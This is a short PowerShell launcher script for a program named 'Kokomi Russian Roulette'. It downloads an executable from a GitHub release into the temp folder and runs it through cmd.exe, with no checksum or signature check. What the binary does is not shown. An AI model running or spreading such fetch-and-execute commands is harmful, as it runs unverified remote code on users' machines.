#One line for KRR.
function krr_call {
  $DownloadUrl = "https://github.com/quantumwavves/Kokomi-Russian-Roulette/releases/download/pre-release/kokomi-russian-roulette.exe"
  $filePath = "$env:temp\kokomi-russian-roulette.exe"
  if ([System.IO.File]::Exists($filePath)) {
    cmd.exe /c "$env:temp\kokomi-russian-roulette.exe"
 }
  else {
    Invoke-WebRequest -UseBasicParsing $DownloadUrl -OutFile "$env:temp\kokomi-russian-roulette.exe"
    Start-Sleep 2
    cmd.exe /c "$env:temp\kokomi-russian-roulette.exe"
  }
}
krr_call
